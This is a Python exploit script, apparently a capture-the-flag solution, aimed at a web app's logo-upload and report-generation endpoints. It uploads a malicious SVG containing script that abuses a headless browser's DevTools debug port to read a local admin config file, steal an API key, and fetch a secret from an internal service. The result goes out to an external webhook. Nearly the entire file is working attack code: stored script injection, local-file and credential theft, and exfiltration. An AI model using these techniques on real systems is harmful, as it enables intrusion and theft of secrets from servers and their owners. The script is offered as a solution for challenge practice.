import requests

url = 'http://cddc2026-challs-alb-2050157501.ap-southeast-1.elb.amazonaws.com:7220/'
s = requests.Session()

s.headers.update({
    'X-User-Id': 'hacked'
})

webhook = 'https://zoupbpa.request.dreamhack.games'

payload = '''
<svg>
    <!-->
    <script>
        function req(method, url, header=null) {
            const x = new XMLHttpRequest()
            x.open(method, url, false)

            if (header) 
                x.setRequestHeader(...header)

            x.send()

            return x.responseText
        }

        wsInfo = req('PUT', 'http://127.0.0.1:9222/json/new?file:///etc/admin/config.json')

        wsUrl = JSON.parse(wsInfo).webSocketDebuggerUrl
        ws = new WebSocket(wsUrl)

        ;(async () => {
            await new Promise((resolve, reject) => {
                ws.onopen = () => {
                    ws.send(JSON.stringify({
                        id: 1,
                        method: "Runtime.evaluate",
                        params: {
                            expression: `document.documentElement.outerHTML.match(/"admin_api_key": "(.+)"/)[1]`
                        }
                    }));
                };

                ws.onmessage = e => {
                    key = JSON.parse(e.data).result.result.value

                    flag = req('GET', 'http://internal-admin:8080/api/flag', ['Authorization', `Bearer ${key}`])
                    req('GET', `%s?e=${encodeURIComponent(flag)}`)
                }
            });
        })()
    </script>
    -->
</svg>
'''.strip() % webhook

res = s.post(f'{url}/upload-logo', files={
    "logo": ("logo.svg", payload, "image/svg+xml")
})

assert res.json()['success']
print("> Payload uploaded")

res = s.post(f"{url}/generate-report", json={
    "title": "a",
    "quarter": "a",
    "sales_data": '{}'
})

assert res.json()['success']
print("> Reported")